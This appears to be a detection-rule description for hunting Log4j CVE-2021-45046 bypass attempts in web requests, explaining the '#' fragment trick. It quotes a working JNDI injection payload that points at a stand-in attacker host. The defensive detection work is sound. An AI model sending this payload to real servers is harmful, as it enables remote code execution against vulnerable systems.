Log4j CVE-2021-45046 JNDI localhost-bypass payload (${jndi:...127.0.0.1#...}) in web requests AIExploitation High
Hunts inbound HTTP requests carrying a JNDI lookup string that uses the URL-fragment trick (a '#' inside the JNDI authority, e.g. 127.0.0.1#evilhost.com) to defeat the localhost-only restriction Log4j added in 2.15.0. This is the specific CVE-2021-45046 bypass, not a generic ${jndi:} sweep — the '#' fragment is the differentiator from CVE-2021-44228. Rationale: Anchored on the exact bypass string from the article (${jndi:ldap://127.0.0.1#evilhost.com:1389/a}); the '#' fragment combined with ${jndi: is the CVE-2021-45046 hallmark that distinguishes it from generic Log4Shell. NVD and GHSA-7rjr-3q55-vv33 confirm the localhost-restriction bypass. Neither in-article image (author headshot, orange hero banner) was a screenshot, so none were fetched.
